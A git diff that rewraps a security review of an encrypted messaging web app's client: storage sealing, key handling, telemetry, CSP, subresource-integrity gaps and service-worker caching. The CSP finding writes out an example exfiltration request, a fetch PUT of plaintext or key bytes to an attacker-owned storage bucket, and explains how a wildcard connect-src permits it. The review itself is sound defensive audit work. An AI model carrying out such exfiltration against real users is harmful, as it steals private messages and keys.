@@ -1,8 +1,17 @@
 # Review 05 — Client / PWA security
 
-_Threat model: the browser endpoint is the **only** place message plaintext and private keys ever exist in the clear — the strongest crypto is moot if the client leaks. The attacker is whoever can run code in or near that endpoint: injected/reflected/stored XSS, a tampered or swapped JS/CSS bundle (compromised CDN / build / Caddy / service worker), a malicious third-party dependency, another browser tab/origin, or a thief who reads IndexedDB / Cache Storage at rest. Slices 1-4 established the server is crypto-blind and the wire/metadata bounded; this slice asks: can the CLIENT be made to cough up plaintext or keys, or does it leak them passively?_
+_Threat model: the browser endpoint is the **only** place message plaintext and
+private keys ever exist in the clear — the strongest crypto is moot if the
+client leaks. The attacker is whoever can run code in or near that endpoint:
+injected/reflected/stored XSS, a tampered or swapped JS/CSS bundle (compromised
+CDN / build / Caddy / service worker), a malicious third-party dependency,
+another browser tab/origin, or a thief who reads IndexedDB / Cache Storage at
+rest. Slices 1-4 established the server is crypto-blind and the wire/metadata
+bounded; this slice asks: can the CLIENT be made to cough up plaintext or keys,
+or does it leak them passively?_
 
-Reviewed against `main` post-#254, 2026-06-19. Read-only adversarial pass: each claim is PROVEN only where a break was attempted and failed.
+Reviewed against `main` post-#254, 2026-06-19. Read-only adversarial pass: each
+claim is PROVEN only where a break was attempted and failed.
 
 ## Claims
 
@@ -15,70 +24,290 @@ Reviewed against `main` post-#254, 2026-06-19. Read-only adversarial pass: each 
 | 5 | `code-delivery-integrity` — delivered client code is integrity-protected (SRI + manifest + SW pinning) so a swapped bundle cannot run | **PARTIAL** (SRI real for static assets; the MLS crypto chunks load via native dynamic `import()` with NO integrity at any layer — CDI-1) |
 | 6 | `service-worker-cache` — the service worker caches static build assets only; no API/content/attachment/auth response, token, or presigned URL ever reaches Cache Storage | **PROVEN** |
 
-Three PROVEN, three PARTIAL — and the PARTIALs cluster into one genuine exploit primitive and one honest-but-overstated guarantee. **The at-rest privacy claim is the strongest result of this slice**: an exhaustive enumeration of every IndexedDB / localStorage / sessionStorage / Cache Storage write in `apps/web` could not produce a single unsealed-plaintext-or-key persistence path — the decrypted message-log specifically is sealed before every `put` (`keystore.ts:762-766`), there is no second IndexedDB, no redux/zustand persist, and no API response is ever cached. The two **active**-attacker PARTIALs combine into the one residual that matters: an in-origin attacker (XSS the strict CSP makes hard to obtain, OR a swapped dynamic-import chunk the SRI gap leaves unverified) can both read plaintext from the heap/IndexedDB and POST it out through the wildcard `connect-src`. Both halves of that chain are **explicitly documented, maintainer-accepted residuals** (`device-keystore.md` §3.1/§5; `code-delivery-integrity.md` §6, Codex #152 P1) — which is why CDI-1 is DOWNGRADED from P1 to P2 and the key-non-extractable break is P3 doc-accuracy, not an exploit. The remaining findings are doc-staleness (the keystore threat models still describe the obsolete Argon2id/passphrase/server-recovery model that #233/0040 deleted) and missing regression guards on the load-bearing controls.
+Three PROVEN, three PARTIAL — and the PARTIALs cluster into one genuine exploit
+primitive and one honest-but-overstated guarantee. **The at-rest privacy claim
+is the strongest result of this slice**: an exhaustive enumeration of every
+IndexedDB / localStorage / sessionStorage / Cache Storage write in `apps/web`
+could not produce a single unsealed-plaintext-or-key persistence path — the
+decrypted message-log specifically is sealed before every `put`
+(`keystore.ts:762-766`), there is no second IndexedDB, no redux/zustand persist,
+and no API response is ever cached. The two **active**-attacker PARTIALs combine
+into the one residual that matters: an in-origin attacker (XSS the strict CSP
+makes hard to obtain, OR a swapped dynamic-import chunk the SRI gap leaves
+unverified) can both read plaintext from the heap/IndexedDB and POST it out
+through the wildcard `connect-src`. Both halves of that chain are **explicitly
+documented, maintainer-accepted residuals** (`device-keystore.md` §3.1/§5;
+`code-delivery-integrity.md` §6, Codex #152 P1) — which is why CDI-1 is
+DOWNGRADED from P1 to P2 and the key-non-extractable break is P3 doc-accuracy,
+not an exploit. The remaining findings are doc-staleness (the keystore threat
+models still describe the obsolete Argon2id/passphrase/server-recovery model
+that #233/0040 deleted) and missing regression guards on the load-bearing
+controls.
 
 ## Per-claim evidence
 
 ### 1. at-rest-plaintext — PROVEN
 
-Every browser-storage write in `apps/web` was enumerated; no unsealed-plaintext-or-key persistence path exists.
+Every browser-storage write in `apps/web` was enumerated; no
+unsealed-plaintext-or-key persistence path exists.
 
-- **One database, all writes sealed.** `argus-keystore` is opened only at `keystore.ts:217` (a repo-wide grep for `openDB`/`createObjectStore`/`idb-keyval`/`localforage`/`Dexie` across `apps/web` + `packages` returns only `keystore.ts`). All 13 write sites persist content/key bytes only inside a `SealedBlob`; the bare plaintext-typed fields are metadata (`identity`, `conversationId`, `version`, `creatorId`, `peerUserId`, `signaturePublicKey` — `StoredDevice:83-86`, `StoredPool:91-95`, `StoredGroupState:103-114`, `StoredMessageLog:135-143`, `StoredVerifiedPeer:167-170`). Every seal goes through `sealWithKey` (`seal.ts:59-73`): AES-256-GCM, fresh 12-byte CSPRNG IV per call (`seal.ts:64`), under a non-extractable key (`seal.ts:50-52`, `extractable=false`).
-- **The decrypted message-log specifically.** Both append callers — `useMessageSending.ts:98-109` and `useConversationBackfill.ts:152-167`, plus `conversations.ts:519` — route exclusively to `keystore.appendMessages → appendMessagesUnlocked`, which seals `te.encode(JSON.stringify(merged))` at `keystore.ts:762-766` **before** the `tx.store.put` at `:772`. No intermediate unsealed put, no draft store, no React/redux/zustand persist (none installed — `package.json:17-31`).
-- **localStorage / sessionStorage / Cache Storage.** localStorage is only `persistence.ts:158`, reached by four metadata-only feature modules (settings, privacy booleans, anon profile, server-verified peer-mapping); `versionedStorageKey` hard-throws on the content/key/token/attachment areas (`persistence.ts:13-24,83-91`). Zero `sessionStorage` writes (grep clean). Cache Storage holds workbox precache (static assets) only — `shouldUsePwaRuntimeCache` returns `false` unconditionally (`pwa-cache-policy.ts:53-58`), so no API/content/attachment response is ever cached. The **access** token is module-memory only (`auth.ts:1-13`). The **refresh** token is a persistent ~30-day `argus_refresh` **HttpOnly** cookie (`session-token.controller.ts:108`, `session-token.service.ts:12`) — not JS-readable (XSS cannot exfil it) and carrying no key or content, but it does persist in the browser profile on disk, so it is called out as a separate at-rest residual (RC-1) below: it grants auth/session/metadata access on a stolen device, **not** message keys or plaintext.
-- **Cross-store replay defense holds.** Contexts are `device` / `key-package-pool` / `group-state:<id>` / `pending-commit:<id>` / bare `<conversationId>` / `verified-peers:<id>`; all ids are server-issued `z.string().uuid()`, a UUID can contain no colon and cannot equal any prefixed literal, and the stores are physically separate keyed object stores — so an identical AAD still cannot cross-contaminate on read. (The bare-conversationId message-log AAD is the one asymmetry — S5-03, defense-in-depth only.)
+- **One database, all writes sealed.** `argus-keystore` is opened only at
+  `keystore.ts:217` (a repo-wide grep for
+  `openDB`/`createObjectStore`/`idb-keyval`/`localforage`/`Dexie` across
+  `apps/web` + `packages` returns only `keystore.ts`). All 13 write sites
+  persist content/key bytes only inside a `SealedBlob`; the bare plaintext-typed
+  fields are metadata (`identity`, `conversationId`, `version`, `creatorId`,
+  `peerUserId`, `signaturePublicKey` — `StoredDevice:83-86`, `StoredPool:91-95`,
+  `StoredGroupState:103-114`, `StoredMessageLog:135-143`,
+  `StoredVerifiedPeer:167-170`). Every seal goes through `sealWithKey`
+  (`seal.ts:59-73`): AES-256-GCM, fresh 12-byte CSPRNG IV per call
+  (`seal.ts:64`), under a non-extractable key (`seal.ts:50-52`,
+  `extractable=false`).
+- **The decrypted message-log specifically.** Both append callers —
+  `useMessageSending.ts:98-109` and `useConversationBackfill.ts:152-167`, plus
+  `conversations.ts:519` — route exclusively to `keystore.appendMessages →
+  appendMessagesUnlocked`, which seals `te.encode(JSON.stringify(merged))` at
+  `keystore.ts:762-766` **before** the `tx.store.put` at `:772`. No intermediate
+  unsealed put, no draft store, no React/redux/zustand persist (none installed —
+  `package.json:17-31`).
+- **localStorage / sessionStorage / Cache Storage.** localStorage is only
+  `persistence.ts:158`, reached by four metadata-only feature modules (settings,
+  privacy booleans, anon profile, server-verified peer-mapping);
+  `versionedStorageKey` hard-throws on the content/key/token/attachment areas
+  (`persistence.ts:13-24,83-91`). Zero `sessionStorage` writes (grep clean).
+  Cache Storage holds workbox precache (static assets) only —
+  `shouldUsePwaRuntimeCache` returns `false` unconditionally
+  (`pwa-cache-policy.ts:53-58`), so no API/content/attachment response is ever
+  cached. The **access** token is module-memory only (`auth.ts:1-13`). The
+  **refresh** token is a persistent ~30-day `argus_refresh` **HttpOnly** cookie
+  (`session-token.controller.ts:108`, `session-token.service.ts:12`) — not
+  JS-readable (XSS cannot exfil it) and carrying no key or content, but it does
+  persist in the browser profile on disk, so it is called out as a separate
+  at-rest residual (RC-1) below: it grants auth/session/metadata access on a
+  stolen device, **not** message keys or plaintext.
+- **Cross-store replay defense holds.** Contexts are `device` /
+  `key-package-pool` / `group-state:<id>` / `pending-commit:<id>` / bare
+  `<conversationId>` / `verified-peers:<id>`; all ids are server-issued
+  `z.string().uuid()`, a UUID can contain no colon and cannot equal any prefixed
+  literal, and the stores are physically separate keyed object stores — so an
+  identical AAD still cannot cross-contaminate on read. (The bare-conversationId
+  message-log AAD is the one asymmetry — S5-03, defense-in-depth only.)
 
-**Why PROVEN.** Every constructed unsealed-persist attempt failed: there is exactly one DB, every key/content write is a `SealedBlob`, no API response is cached, the *access* token never leaves memory, and no console/serialize path leaks the plaintext that feeds `sealWithKey`. The verdict is about message **plaintext + key bytes**, and none persist unsealed; the one persistent secret at rest is the HttpOnly `argus_refresh` cookie (RC-1), which carries auth/session access but no key or content. The remaining findings are stale threat-model docs (S5-01, S5-02) and one self-contained AAD-hardening nit (S5-03) — none weakens the runtime claim.
+**Why PROVEN.** Every constructed unsealed-persist attempt failed: there is
+exactly one DB, every key/content write is a `SealedBlob`, no API response is
+cached, the *access* token never leaves memory, and no console/serialize path
+leaks the plaintext that feeds `sealWithKey`. The verdict is about message
+**plaintext + key bytes**, and none persist unsealed; the one persistent secret
+at rest is the HttpOnly `argus_refresh` cookie (RC-1), which carries
+auth/session access but no key or content. The remaining findings are stale
+threat-model docs (S5-01, S5-02) and one self-contained AAD-hardening nit
+(S5-03) — none weakens the runtime claim.
 
 ### 2. key-non-extractable — PARTIAL
 
-Tried to extract a key, read raw bytes, or find an unsealed-persist / log / global-leak path and **could not** — but the claim's literal mechanism is false for half the key material, so it is PARTIAL per default-to-caution.
+Tried to extract a key, read raw bytes, or find an unsealed-persist / log /
+global-leak path and **could not** — but the claim's literal mechanism is false
+for half the key material, so it is PARTIAL per default-to-caution.
 
-**What holds (could not break).** The unlock key is a non-extractable AES-GCM `CryptoKey` with minimal usages (`seal.ts:50-53`, asserts 32 bytes); attachment content keys are likewise `extractable=false`, single-usage (`seal.ts:124,145`). No `exportKey` anywhere in `apps/web/src` or `packages/crypto/src` (grep clean); no key on `window`/`globalThis`. The raw PRF secret is wiped after import (`prf.ts:101-103`, `secret.fill(0)` in `finally`); transient device/pool plaintext is wiped after sealing (`keystore.ts:251,313,358,868`); spent ratchet arrays are wiped at 8 sites incl. a fail-closed `wipe(result.consumed)` (`index.ts:531,643,669,689,707`). The crypto-blind boundary holds: `stripPrfResults` deletes `clientExtensionResults.prf` **before** the verify POST on every path (`prf.ts:82-85,93-104`). All randomness is CSPRNG (`crypto.getRandomValues`/`randomUUID`); the one backoff jitter uses `getRandomValues` (`ws.ts:255`), zero `Math.random` (Semgrep total-ban). No hand-rolled crypto client-side. Every `console.warn` logs an id + fixed string or `err.message`; seal-layer decrypt errors are fixed strings (`seal.ts:92,153`); no browser telemetry SDK installed.
+**What holds (could not break).** The unlock key is a non-extractable AES-GCM
+`CryptoKey` with minimal usages (`seal.ts:50-53`, asserts 32 bytes); attachment
+content keys are likewise `extractable=false`, single-usage (`seal.ts:124,145`).
+No `exportKey` anywhere in `apps/web/src` or `packages/crypto/src` (grep clean);
+no key on `window`/`globalThis`. The raw PRF secret is wiped after import
+(`prf.ts:101-103`, `secret.fill(0)` in `finally`); transient device/pool
+plaintext is wiped after sealing (`keystore.ts:251,313,358,868`); spent ratchet
+arrays are wiped at 8 sites incl. a fail-closed `wipe(result.consumed)`
+(`index.ts:531,643,669,689,707`). The crypto-blind boundary holds:
+`stripPrfResults` deletes `clientExtensionResults.prf` **before** the verify
+POST on every path (`prf.ts:82-85,93-104`). All randomness is CSPRNG
+(`crypto.getRandomValues`/`randomUUID`); the one backoff jitter uses
+`getRandomValues` (`ws.ts:255`), zero `Math.random` (Semgrep total-ban). No
+hand-rolled crypto client-side. Every `console.warn` logs an id + fixed string
+or `err.message`; seal-layer decrypt errors are fixed strings
+(`seal.ts:92,153`); no browser telemetry SDK installed.
 
-**What is false as written (why PARTIAL).** "All private key material are non-extractable `CryptoKey`s … raw bytes never exposed to JS, never serialized" is incorrect for the MLS layer. The MLS identity/HPKE privates are raw `Uint8Array`/`bigint` inside ts-mls `PrivateKeyPackage` objects (`index.ts:80-83,264`), held in React state (`features/device/DeviceContext.tsx:87-88`), **serialized to JS strings** by `serializeDeviceKeys`/`serializeDeviceKeysArray` (`device-codec.ts:43-45,57-59`), and the bare 32-byte Ed25519 seed is sliced out by `deviceSignatureSeed` (`device-codec.ts:99-101`) to sign a withdraw proof (`DeviceContext.tsx:193`). ts-mls is pure JS, so these structurally cannot be `CryptoKey`s. This does **not** breach the invariant — those bytes are immediately sealed (`keystore.ts:249-251`), never written unsealed, never sent to the server (only `SealedBlob` + public packages cross the wire; `serializeDeviceIdentity` excludes `initPrivateKey`/`hpkePrivateKey`, proven `device-codec.spec.ts:40-41`), and never logged. The in-session XSS exposure (raw keys in heap; `sessionKey` reachable as a decrypt oracle) is explicitly accepted in `device-keystore.md:16,34` and mitigated by the strict CSP.
+**What is false as written (why PARTIAL).** "All private key material are
+non-extractable `CryptoKey`s … raw bytes never exposed to JS, never serialized"
+is incorrect for the MLS layer. The MLS identity/HPKE privates are raw
+`Uint8Array`/`bigint` inside ts-mls `PrivateKeyPackage` objects
+(`index.ts:80-83,264`), held in React state
+(`features/device/DeviceContext.tsx:87-88`), **serialized to JS strings** by
+`serializeDeviceKeys`/`serializeDeviceKeysArray`
+(`device-codec.ts:43-45,57-59`), and the bare 32-byte Ed25519 seed is sliced out
+by `deviceSignatureSeed` (`device-codec.ts:99-101`) to sign a withdraw proof
+(`DeviceContext.tsx:193`). ts-mls is pure JS, so these structurally cannot be
+`CryptoKey`s. This does **not** breach the invariant — those bytes are
+immediately sealed (`keystore.ts:249-251`), never written unsealed, never sent
+to the server (only `SealedBlob` + public packages cross the wire;
+`serializeDeviceIdentity` excludes `initPrivateKey`/`hpkePrivateKey`, proven
+`device-codec.spec.ts:40-41`), and never logged. The in-session XSS exposure
+(raw keys in heap; `sessionKey` reachable as a decrypt oracle) is explicitly
+accepted in `device-keystore.md:16,34` and mitigated by the strict CSP.
 
-**Why PARTIAL.** The protection is sound and no key could be extracted or leaked, but the asserted mechanism overstates the guarantee for the MLS layer. P3 findings only (claim/doc accuracy + accepted residuals); no P1/P2 exploit path.
+**Why PARTIAL.** The protection is sound and no key could be extracted or
+leaked, but the asserted mechanism overstates the guarantee for the MLS layer.
+P3 findings only (claim/doc accuracy + accepted residuals); no P1/P2 exploit
+path.
 
 ### 3. client-telemetry-clean — PROVEN
 
 No off-device telemetry path exists, and every live logging surface is content/key-free.
 
-- **No network sink, no SDK.** Grep across `apps/web/src` found no `sendBeacon`, no analytics/error `fetch`, no `/telemetry|/events|/log|/metric|/report` endpoint, no `Image()` pixel, no `window.onerror`/`onunhandledrejection`, no forwarding ErrorBoundary (`main.tsx` installs none). `package.json` has zero observability/error/analytics deps (no `@sentry/*`, PostHog, web-vitals); GlitchTip is server-side only.
-- **Dormant validator.** `createTelemetryEvent` (`telemetry.ts:216-241`) has zero production callers (grep: only its own spec). It is architected default-deny — the only free-form type (string) is gated by a 13-key allowlist `technicalStringMetadataKeys` + `isTechnicalStringValue` (`:231-236`), so a free-form PII string under `email`/`conversationId`/`argusId` is rejected regardless of the denylist.
-- **Console sinks only, content-free.** The sole runtime logging is 14 `console.warn` calls, every one `(fixed-string, id, err instanceof Error ? err.message : err)` — no `console.log/error/debug/info`, no full-error-object logging (no stack traces), no `JSON.stringify(err)`, no token/key/secret arg. These write to devtools, not the network. `seal.ts` decrypt/seal failures are fixed strings; `index.ts` errors interpolate only non-secret metadata; the decrypted plaintext at `index.ts:715` is a **return** value, never an error message.
+- **No network sink, no SDK.** Grep across `apps/web/src` found no `sendBeacon`,
+  no analytics/error `fetch`, no `/telemetry|/events|/log|/metric|/report`
+  endpoint, no `Image()` pixel, no `window.onerror`/`onunhandledrejection`, no
+  forwarding ErrorBoundary (`main.tsx` installs none). `package.json` has zero
+  observability/error/analytics deps (no `@sentry/*`, PostHog, web-vitals);
+  GlitchTip is server-side only.
+- **Dormant validator.** `createTelemetryEvent` (`telemetry.ts:216-241`) has
+  zero production callers (grep: only its own spec). It is architected
+  default-deny — the only free-form type (string) is gated by a 13-key allowlist
+  `technicalStringMetadataKeys` + `isTechnicalStringValue` (`:231-236`), so a
+  free-form PII string under `email`/`conversationId`/`argusId` is rejected
+  regardless of the denylist.
+- **Console sinks only, content-free.** The sole runtime logging is 14
+  `console.warn` calls, every one `(fixed-string, id, err instanceof Error ?
+  err.message : err)` — no `console.log/error/debug/info`, no full-error-object
+  logging (no stack traces), no `JSON.stringify(err)`, no token/key/secret arg.
+  These write to devtools, not the network. `seal.ts` decrypt/seal failures are
+  fixed strings; `index.ts` errors interpolate only non-secret metadata; the
+  decrypted plaintext at `index.ts:715` is a **return** value, never an error
+  message.
 
-**Why PROVEN.** Every constructed exfil attempt was blocked: there is no transport, the dormant validator default-denies, and every console line is id + short message. The two findings (OBS-1 latent denylist gap, OBS-2 raw non-Error throw) are both about a dormant module or devtools-only output on a device the attacker already controls.
+**Why PROVEN.** Every constructed exfil attempt was blocked: there is no
+transport, the dormant validator default-denies, and every console line is id +
+short message. The two findings (OBS-1 latent denylist gap, OBS-2 raw non-Error
+throw) are both about a dormant module or devtools-only output on a device the
+attacker already controls.
 
 ### 4. csp-xss-exfil — PARTIAL
 
-The CSP is genuinely enforcing and the run-prevention half is strong, but the exfil-prevention half is weakened by a wildcard `connect-src`, and HSTS is unproven (downgraded).
+The CSP is genuinely enforcing and the run-prevention half is strong, but the
+exfil-prevention half is weakened by a wildcard `connect-src`, and HSTS is
+unproven (downgraded).
 
-**Strong / proven parts.** Served as `Content-Security-Policy` (enforcing, not Report-Only) at the origin (`Caddyfile:62`); no `report-uri`/`report-to`/`-Report-Only` anywhere. `script-src 'self'` only — no `unsafe-inline`, no `unsafe-eval`, no `data:`/`blob:` in script-src; `index.html` carries exactly one same-origin module script and zero inline script (`index.html:24`), so strict `script-src 'self'` is tight and sufficient. No HTML-injection sink: grep for `dangerouslySetInnerHTML`/`innerHTML`/`document.write`/`eval(`/`new Function`/`javascript:` across `apps/web/src` returns nothing. `object-src 'none'`, `base-uri 'none'`, `frame-ancestors 'none'`, `form-action 'self'`, nosniff, `X-Frame-Options DENY`, `Referrer-Policy no-referrer`, tight Permissions-Policy all present (`Caddyfile:62-67`). The recon worry about a missing IdP `connect-src` is moot — Zitadel/OIDC was decommissioned (#223), auth is passkey-only, all ceremonies POST same-origin (`api.ts:124-179`, `api-client.ts:3`).
+**Strong / proven parts.** Served as `Content-Security-Policy` (enforcing, not
+Report-Only) at the origin (`Caddyfile:62`); no
+`report-uri`/`report-to`/`-Report-Only` anywhere. `script-src 'self'` only — no
+`unsafe-inline`, no `unsafe-eval`, no `data:`/`blob:` in script-src;
+`index.html` carries exactly one same-origin module script and zero inline
+script (`index.html:24`), so strict `script-src 'self'` is tight and sufficient.
+No HTML-injection sink: grep for
+`dangerouslySetInnerHTML`/`innerHTML`/`document.write`/`eval(`/`new
+Function`/`javascript:` across `apps/web/src` returns nothing. `object-src
+'none'`, `base-uri 'none'`, `frame-ancestors 'none'`, `form-action 'self'`,
+nosniff, `X-Frame-Options DENY`, `Referrer-Policy no-referrer`, tight
+Permissions-Policy all present (`Caddyfile:62-67`). The recon worry about a
+missing IdP `connect-src` is moot — Zitadel/OIDC was decommissioned (#223), auth
+is passkey-only, all ceremonies POST same-origin (`api.ts:124-179`,
+`api-client.ts:3`).
 
-**The break.** `connect-src` includes `https://*.s3.eu-central-003.backblazeb2.com` (`Caddyfile:62`). B2 buckets are virtual-host style (`S3_FORCE_PATH_STYLE='false'`, `compose.prod.yaml:115`), the `eu-central-003` region namespace is shared across all B2 accounts, so an attacker can create a bucket and injected JS can `fetch(PUT https://<attacker>.s3.eu-central-003.backblazeb2.com/leak, body=<plaintext|key bytes>)` — the CSP permits it. Bucket-side CORS (`allowedOrigins:["https://4rgus.com"]`) does **not** stop it: CORS gates reading the response, not delivery of the request body, and the attacker controls their own bucket's CORS. `putAttachmentBlob`/`getAttachmentBlob` fetch whatever URL is passed with no host allowlist (`api.ts:514-530`). The app only ever talks to one bucket — the production attachment bucket is `attachment-r8xq4m7z2p9n6k3v` (`infra/stack/deploy/deploy.sh:499`, `infra/cleanup/argus-attachment-cleanup.service:36`; the `compose.prod.yaml` default `argus-attachments` is dev-only) — so the wildcard buys nothing and widens egress to the whole region's tenants. **The same `connect-src` also lists the bare regional endpoint `https://s3.eu-central-003.backblazeb2.com` (path-style).** Because a CSP source expression is scheme+host+port only — it **cannot** restrict the URL path — that bare host permits a path-style POST to *any* bucket (`https://s3.eu-central-003.backblazeb2.com/<attacker-bucket>/…`), so removing the wildcard alone does **not** close the exfil path. Production uses virtual-host addressing (`forcePathStyle` defaults `false`, `blob-config.ts:65`), so the bare path-style endpoint is not needed by the app and must be removed as well.
+**The break.** `connect-src` includes
+`https://*.s3.eu-central-003.backblazeb2.com` (`Caddyfile:62`). B2 buckets are
+virtual-host style (`S3_FORCE_PATH_STYLE='false'`, `compose.prod.yaml:115`), the
+`eu-central-003` region namespace is shared across all B2 accounts, so an
+attacker can create a bucket and injected JS can `fetch(PUT
+https://<attacker>.s3.eu-central-003.backblazeb2.com/leak, body=<plaintext|key
+bytes>)` — the CSP permits it. Bucket-side CORS
+(`allowedOrigins:["https://4rgus.com"]`) does **not** stop it: CORS gates
+reading the response, not delivery of the request body, and the attacker
+controls their own bucket's CORS. `putAttachmentBlob`/`getAttachmentBlob` fetch
+whatever URL is passed with no host allowlist (`api.ts:514-530`). The app only
+ever talks to one bucket — the production attachment bucket is
+`attachment-r8xq4m7z2p9n6k3v` (`infra/stack/deploy/deploy.sh:499`,
+`infra/cleanup/argus-attachment-cleanup.service:36`; the `compose.prod.yaml`
+default `argus-attachments` is dev-only) — so the wildcard buys nothing and
+widens egress to the whole region's tenants. **The same `connect-src` also lists
+the bare regional endpoint `https://s3.eu-central-003.backblazeb2.com`
+(path-style).** Because a CSP source expression is scheme+host+port only — it
+**cannot** restrict the URL path — that bare host permits a path-style POST to
+*any* bucket (`https://s3.eu-central-003.backblazeb2.com/<attacker-bucket>/…`),
+so removing the wildcard alone does **not** close the exfil path. Production
+uses virtual-host addressing (`forcePathStyle` defaults `false`,
+`blob-config.ts:65`), so the bare path-style endpoint is not needed by the app
+and must be removed as well.
 
-**Why PARTIAL.** Run-prevention proven; the bounded-`connect-src` guarantee is false for a wildcard into a shared-tenant namespace (CSP-1, P2). HSTS is asserted but lives in no reviewable artifact (CSP-2, downgraded to P3 — it is an edge concern, and first-load TOFU is already an accepted residual). No automated test pins the header set (CSP-3, P3) and the threat-model docs still cite a dead Zitadel `connect-src` origin (CSP-4, P3).
+**Why PARTIAL.** Run-prevention proven; the bounded-`connect-src` guarantee is
+false for a wildcard into a shared-tenant namespace (CSP-1, P2). HSTS is
+asserted but lives in no reviewable artifact (CSP-2, downgraded to P3 — it is an
+edge concern, and first-load TOFU is already an accepted residual). No automated
+test pins the header set (CSP-3, P3) and the threat-model docs still cite a dead
+Zitadel `connect-src` origin (CSP-4, P3).
 
 ### 5. code-delivery-integrity — PARTIAL
 
-Verified against the shipped build. SRI is real for **some** assets: `dist/index.html:21-27` carries valid `integrity="sha384-…"` + `crossorigin` on the entry script, 5 static modulepreload chunks, and the CSS (7 attrs); `vite-plugin-sri3` injects integrity onto `<script>`/`<link rel=stylesheet>`/`<link rel=modulepreload>` only.
+Verified against the shipped build. SRI is real for **some** assets:
+`dist/index.html:21-27` carries valid `integrity="sha384-…"` + `crossorigin` on
+the entry script, 5 static modulepreload chunks, and the CSS (7 attrs);
+`vite-plugin-sri3` injects integrity onto `<script>`/`<link
+rel=stylesheet>`/`<link rel=modulepreload>` only.
 
-**The break.** The MLS crypto primitive chunks load via **native dynamic `import()`** — the shipped entry bundle contains literal `await import('./nist-…js')` (noble p256/p384/p521) and `await import('./ed448-…js')`; `nist/ed448/chacha/ml-dsa/ml-kem/dhkem/hybridkem` appear **0 times** in `index.html`'s SRI set, and native dynamic import cannot carry integrity. The documented Workbox precache backstop is **false**: shipped `dist/sw.js` contains `"integrity"` **zero** times; every `/assets/*.js` entry is `{url, revision:null}`. Workbox 7.4.1 treats `revision:null` as "the URL is its own version" (no hash appended, none verified — `createCacheKey.ts:50-58`), records an integrity only when the manifest entry **has** an `integrity` property (it does not — `PrecacheController.ts:158-167`), so the install fetch runs with `integrity:undefined` (`:209-216`) and Workbox never re-hashes the response. This refutes `code-delivery-integrity.md:46-48`. CSP `script-src 'self'` does not help — a swapped same-origin chunk **is** 'self'. The published `bundle-manifest.json` is self-served by the same origin (`TransparencyRoute.tsx:30,145`) with no out-of-band anchor and no CI/deploy/SW verification of served bytes — an attacker who swaps a chunk serves a matching manifest, so the Transparency page shows green ("verifies the attacker against the attacker").
+**The break.** The MLS crypto primitive chunks load via **native dynamic
+`import()`** — the shipped entry bundle contains literal `await
+import('./nist-…js')` (noble p256/p384/p521) and `await import('./ed448-…js')`;
+`nist/ed448/chacha/ml-dsa/ml-kem/dhkem/hybridkem` appear **0 times** in
+`index.html`'s SRI set, and native dynamic import cannot carry integrity. The
+documented Workbox precache backstop is **false**: shipped `dist/sw.js` contains
+`"integrity"` **zero** times; every `/assets/*.js` entry is `{url,
+revision:null}`. Workbox 7.4.1 treats `revision:null` as "the URL is its own
+version" (no hash appended, none verified — `createCacheKey.ts:50-58`), records
+an integrity only when the manifest entry **has** an `integrity` property (it
+does not — `PrecacheController.ts:158-167`), so the install fetch runs with
+`integrity:undefined` (`:209-216`) and Workbox never re-hashes the response.
+This refutes `code-delivery-integrity.md:46-48`. CSP `script-src 'self'` does
+not help — a swapped same-origin chunk **is** 'self'. The published
+`bundle-manifest.json` is self-served by the same origin
+(`TransparencyRoute.tsx:30,145`) with no out-of-band anchor and no CI/deploy/SW
+verification of served bytes — an attacker who swaps a chunk serves a matching
+manifest, so the Transparency page shows green ("verifies the attacker against
+the attacker").
 
-**Mitigating and correctly built.** cosign image signing + VM verification (`cd.yml:107-110,145`) protects the build→origin leg, narrowing the live exploit to the Cloudflare edge / CDN / cache + runtime-origin compromise — exactly this slice's threat actors, and exactly what SRI is supposed to cover.
+**Mitigating and correctly built.** cosign image signing + VM verification
+(`cd.yml:107-110,145`) protects the build→origin leg, narrowing the live exploit
+to the Cloudflare edge / CDN / cache + runtime-origin compromise — exactly this
+slice's threat actors, and exactly what SRI is supposed to cover.
 
-**Why PARTIAL (and CDI-1 downgraded P1→P2).** The exploit path is real and lands inside the crypto boundary (worst-possible asset), but it is the SRI half of an **explicitly documented, maintainer-accepted residual** (Codex #152 P1; `code-delivery-integrity.md:115-128`; `vite.config.ts:169-173`, decision dated 2026-06-09), not a fresh break of the privacy claim. The genuinely new delta is the false Workbox-backstop sentence (CDI-2) and the missing forward control (an SW fetch handler enforcing manifest sha384 — confirmed absent in `sw.ts`).
+**Why PARTIAL (and CDI-1 downgraded P1→P2).** The exploit path is real and lands
+inside the crypto boundary (worst-possible asset), but it is the SRI half of an
+**explicitly documented, maintainer-accepted residual** (Codex #152 P1;
+`code-delivery-integrity.md:115-128`; `vite.config.ts:169-173`, decision dated
+2026-06-09), not a fresh break of the privacy claim. The genuinely new delta is
+the false Workbox-backstop sentence (CDI-2) and the missing forward control (an
+SW fetch handler enforcing manifest sha384 — confirmed absent in `sw.ts`).
 
 ### 6. service-worker-cache — PROVEN
 
 The SW runtime surface is exactly two cache-relevant operations and nothing else.
 
-- **No caching route over sensitive traffic.** `sw.ts:11-19` is `cleanupOutdatedCaches()` + `precacheAndRoute(self.__WB_MANIFEST)` + ONE `NavigationRoute`. No `runtimeCaching`/`registerRoute` over `/api`, `/ws`, attachments, or auth exists anywhere (grep for `runtimeCaching`/`NetworkFirst`/`StaleWhileRevalidate`/`CacheFirst`/`cache.put`/`caches.open`/`cache.add` across `apps/web/src` returns only the `NavigationRoute` and the dead policy helper). Precache glob is build-time static assets only (`pwa-cache-policy.ts:1-11`), computed from `dist/` at build, so it cannot contain a runtime response.
-- **Cached shell carries no secret.** The precached `index.html` is content-free (`index.html:1-26`); the access token lives only in module memory (`auth.ts:1-13`), and the persistent `argus_refresh` cookie is HttpOnly (not in Cache Storage, not JS-readable; carries no key/content — RC-1). `NavigationRoute` matches only `request.mode==='navigate'`; API calls go through `apiFetch`→`/api/*` (`api-client.ts:62-72`) and attachments to presigned B2 URLs (`attachments.ts:24-25,43`) — none are navigations, none match, none are cached; decrypted attachment bytes become an in-memory `blob:` URL only (`attachments.ts:50`).
-- **Push handler content-free.** Never reads `event.data`, caches, or logs (`sw.ts:24-34`) — matches `web-push.md` §1. Stale-bundle resistance via `cleanupOutdatedCaches()`, `registerType:'prompt'` with a `cache:'no-store'` update fetch (`PwaUpdateProvider.tsx:53-56`), and Caddy `no-cache` on everything except content-hashed assets (`Caddyfile:79-82`).
+- **No caching route over sensitive traffic.** `sw.ts:11-19` is
+  `cleanupOutdatedCaches()` + `precacheAndRoute(self.__WB_MANIFEST)` + ONE
